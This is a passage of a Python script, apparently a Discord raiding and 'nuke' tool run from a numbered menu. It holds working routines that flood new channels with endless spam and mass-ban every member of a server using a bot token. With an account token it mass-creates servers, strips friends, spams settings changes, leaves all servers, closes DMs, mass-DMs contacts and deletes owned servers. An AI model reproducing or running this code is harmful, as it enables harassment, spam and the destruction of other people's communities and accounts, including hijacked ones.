                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{chanless} has been created')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')

                @client.event
                async def on_guild_channel_create(channel):
                    while True:
                        try:
                            await channel.send(spam)
                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} SPAMMIMG :)')

                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant spam')

                def thread():
                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()

                thread()

                def thread2():
                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()

                thread2()

            if choicee == '2':
                print(f'{Fore.LIGHTMAGENTA_EX}For for banning write to chat: !massban{Fore.RESET}')
                headers = {
                    "Authorization":
                        f"Bot {TOKEN}"
                }

                client2 = commands.Bot(
                    command_prefix='!',
                    intents=discord.Intents.all(),
                    help_command=None
                )

                @client2.command()
                async def massban(ctx):
                    await ctx.message.delete()
                    servr = ctx.guild.id

                    def mass_ban(i):
                        sessions = requests.Session()
                        sessions.put(
                            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
                            headers=headers
                        )

                    for i in range(3):
                        for member in list(ctx.guild.members):
                            threading.Thread(
                                target=mass_ban,
                                args=(member.id,)
                            ).start()
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done...')

                client2.run(TOKEN)

        time.sleep(5)
        exit = input('press any key: ')
        exit = clear()
        exit = spammer()



    if choice == '10':

        tokenn = input("Account Token: ")

        print(f'''{Fore.LIGHTBLUE_EX}[1]{Fore.RESET}{Fore.LIGHTCYAN_EX} Server spam{Fore.RESET}
{Fore.LIGHTBLUE_EX}[2]{Fore.RESET}{Fore.LIGHTCYAN_EX} Remove all friends{Fore.RESET}
{Fore.LIGHTBLUE_EX}[3]{Fore.RESET}{Fore.LIGHTCYAN_EX} Block all friends{Fore.RESET}
{Fore.LIGHTBLUE_EX}[4]{Fore.RESET}{Fore.LIGHTCYAN_EX} Spam settings{Fore.RESET}
{Fore.LIGHTBLUE_EX}[5]{Fore.RESET}{Fore.LIGHTCYAN_EX} Leave all servers{Fore.RESET}
{Fore.LIGHTBLUE_EX}[6]{Fore.RESET}{Fore.LIGHTCYAN_EX} Close all DMs{Fore.RESET}
{Fore.LIGHTBLUE_EX}[7]{Fore.RESET}{Fore.LIGHTCYAN_EX} Send mass DM{Fore.RESET}
{Fore.LIGHTBLUE_EX}[8]{Fore.RESET}{Fore.LIGHTCYAN_EX} Delete all personal Servers{Fore.RESET}''')

        def servers(token):
            cumt = int(input('How many server you wanna create: '))
            server_name = input('Servers names: ')
            headers = mainHeader(token)
            for i in range(cumt):
                payload = {"name": server_name}
                requests.post(
                    "https://discord.com/api/v9/guilds", headers=headers, json=payload
                )

        def remove_friends(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            rmvfr = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in rmvfr:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Removed Friend {i['id']}")

        def block_friends(token):
            headers = {"authorization": token, "user-agent": "bruh6/9"}
            json = {"type": 2}
            blck = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in blck:
                requests.put(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] Blocked Friend {i['id']} {Fore.RESET}")

        def settings(token):
            print(f'{Fore.LIGHTGREEN_EX}[+] Starting{Fore.RESET}')
            for i in range(0, 100):
                headers = mainHeader(token)
                changset = True
                payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                           "message_display_compact": changset, "explicit_content_filter": 2,
                           "default_guilds_restricted": changset,
                           "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                                   "mutual_guilds": changset},
                           "inline_embed_media": changset, "inline_attachment_media": changset,
                           "gif_auto_play": changset, "render_embeds": changset,
                           "render_reactions": changset, "animate_emoji": changset,
                           "convert_emoticons": changset, "animate_stickers": 1,
                           "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                           "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                           "stream_notifications_enabled": changset, "status": "idle",
                           "detect_platform_accounts": changset, "disable_games_tab": changset}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                changset = False
                payload = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                           "message_display_compact": changset, "explicit_content_filter": 0,
                           "default_guilds_restricted": changset,
                           "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                                   "mutual_guilds": changset},
                           "inline_embed_media": changset, "inline_attachment_media": changset,
                           "gif_auto_play": changset, "render_embeds": changset,
                           "render_reactions": changset, "animate_emoji": changset,
                           "convert_emoticons": changset, "animate_stickers": 2,
                           "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                           "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                           "stream_notifications_enabled": changset, "status": "dnd",
                           "detect_platform_accounts": changset, "disable_games_tab": changset}
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)

        def server_leave(token):
            headers = {"authorization": token, "user-agent": "bruh6/9"}
            levlservr = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for serr in levlservr:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{serr['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Left Guild: {serr['id']}")

        def dms_close(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            clsdms = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for channel in clsdms:
                requests.delete(
                    f"https://discord.com/api/v9/channels/{channel['id']}",
                    headers=headers,
                )

        def mass_dm(token):
            message = input('Message: ')
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            reqmas = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for chen in reqmas:
                json = {"content": message}
                time.sleep(1)
                requests.post(
                    f"https://discord.com/api/v9/channels/{chen['id']}/messages",
                    headers=headers,
                    data=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} {chen['id']} Sent")

        def delete_servers(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Deleting...")
            dmms = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for i in dmms:
                requests.post(
                    f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                    headers=headers,
                )
                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{i["id"]} deleted')

        options = {
            "1": servers,
            "2": remove_friends,
            "3": block_friends,
            "4": settings,
            "5": server_leave,
            "6": dms_close,
            "7": mass_dm,
            "8": delete_servers
        }

        def main():
            choiceee = input("[?]> ")
            threading.Thread(target=options[choiceee](tokenn)).start()

        if __name__ == "__main__":
            while 1:
                main()

        time.sleep(5)

        exit = input('press any key: ')
        exit = clear()
        exit = spammer()


    if choice == '11':
        print(f'''{Fore.LIGHTBLUE_EX}    문제점이 있다면
    https://aztra.xyz/invite/f5zd2wFM 로 문의주시면
    감사하겠습니다
{Fore.RESET}''')


        exit = input('press any key: ')
        exit = clear()
        exit = spammer()


    if choice == '12':
        os.system('exit')


    else:
        print(f'{Fore.LIGHTRED_EX}Missclick?{Fore.RESET}')
        exit = input('press any key: ')
        exit = clear()
        exit = spammer()


spammer()